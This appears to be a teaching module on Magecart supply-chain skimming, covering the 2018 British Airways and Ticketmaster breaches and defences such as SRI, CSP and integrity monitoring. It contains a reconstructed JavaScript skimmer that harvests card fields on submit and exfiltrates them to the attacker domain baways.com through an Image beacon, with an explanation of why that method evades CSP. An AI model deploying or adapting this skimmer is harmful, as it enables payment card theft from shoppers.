Magecart — Supply Chain XSS

SUPPLY CHAIN SKIMMER Active 2015–present  |  Notable victims: British Airways, Ticketmaster, Newegg  |  Module: M16

What is Magecart?

Magecart is the collective name for a group of threat actors (and the attack technique they popularised) that inject JavaScript skimmers into e-commerce payment pages to steal payment card data. The injection method is supply chain compromise: rather than attacking the target site directly, Magecart compromises a third-party JavaScript dependency that the target site loads.

This is technically XSS — malicious JavaScript executing on a payment page and exfiltrating data. The novel element is the injection vector: the attacker injects into a JS file that is served to thousands of sites, rather than finding an XSS vulnerability in each target individually.

Attack Flow

Attacker compromises CDN / third-party JS provider
         ↓
Malicious code injected into legitimate JS file
         ↓
Target site loads JS from the provider (no changes to target)
         ↓
Malicious JS executes in victim browser on the payment page
         ↓
JS listens for form submit → harvests card data → exfiltrates to attacker's server
         ↓
Real transaction proceeds → victim unaware

The British Airways Breach (2018)

The most prominent Magecart incident. Attackers compromised a JavaScript file on British Airways' CDN. The injected skimmer ran on the BA booking flow (ba.com/booking) and exfiltrated card data to baways.com — a lookalike domain registered by the attackers two weeks before the attack.

The skimmer ran undetected for 15 days (August 21 – September 5, 2018) before a researcher at RiskIQ discovered it by comparing the current JS files against archived versions. Approximately 500,000 customers' card details were stolen.

The ICO (UK Information Commissioner's Office) fined British Airways £20 million under GDPR (reduced from an initial £183 million notice).

Reconstructed Skimmer (simplified)

(function() {
  document.querySelector('[name="paymentForm"]')
    .addEventListener('submit', function() {
      var data = {
        name:   q('[name="cardName"]'),
        number: q('[name="cardNumber"]'),
        expiry: q('[name="expiryMonth"]') + '/' + q('[name="expiryYear"]'),
        cvv:    q('[name="cvvNumber"]'),
        email:  q('[name="email"]'),
        src:    location.href
      };
      new Image().src = 'https://baways.com/gateway/v1/cdn?' +
        Object.keys(data).map(k => k+'='+encodeURIComponent(data[k])).join('&');
    });

  function q(sel) {
    var el = document.querySelector(sel);
    return el ? el.value : '';
  }
})();
22 lines. Listens for form submit. Collects all payment fields. Sends to attacker's domain via Image beacon (avoids CORS). Does not cancel the submit — the real transaction goes through.
Why Image beacon? Using new Image().src = attacker_url to exfiltrate data is a common technique because: (1) it's a GET request, so no CORS preflight; (2) CSP connect-src doesn't apply to image loads — you also need img-src; (3) browsers don't show image requests in the network tab as obviously as fetch/XHR. Some older CSP advisories forgot to restrict img-src alongside connect-src.

The Ticketmaster Breach (2018)

A parallel incident with a critical architectural difference. Attackers compromised Inbenta Technologies, a chat support widget provider. Inbenta served different JS to each customer — so only Ticketmaster UK's customers were affected, not all Inbenta customers.

The critical architectural mistake: Ticketmaster UK loaded the Inbenta script from a subdomain of ticketmaster.com (inbenta.ticketmaster.com). This made the script same-origin with the payment page. The script had unrestricted access to all DOM content, cookies, and could make credentialed requests to the Ticketmaster API.

If the script had been loaded from cdn.inbenta.com (Inbenta's own domain), it would be cross-origin — restricted by browser same-origin policy. By hosting it on a Ticketmaster subdomain, Ticketmaster inadvertently gave the third-party full same-origin access.

Defenses

Subresource Integrity (SRI) — the most direct defense:

<script
  src="https://cdn.example.com/lib.js"
  integrity="sha256-[hash of expected file]"
  crossorigin="anonymous"></script>

If the CDN serves a modified file, the hash won't match — the browser refuses to execute it. SRI would have blocked both the BA and Ticketmaster skimmers immediately.

Content Security Policy — connect-src + img-src:

Content-Security-Policy:
  connect-src 'self' https://ba.com;
  img-src 'self' data:;

The Image beacon exfiltration to baways.com would fail. This defense requires correctly restricting both connect-src and img-src — a common oversight is restricting only connect-src.

Third-party script hosting policy:

Never host third-party scripts on subdomains of your own domain. If a third-party script must run on your page, load it from the third party's own domain and apply SRI. A script at cdn.vendor.com is cross-origin; a script at vendor.yoursite.com is same-origin. The difference is full DOM access.

Continuous integrity monitoring:

Compare deployed JS file hashes against expected hashes on every deployment and periodically thereafter. BA's skimmer ran for 15 days because no monitoring detected that a JS file had changed. A daily diff against a known-good baseline would have detected the change within 24 hours.
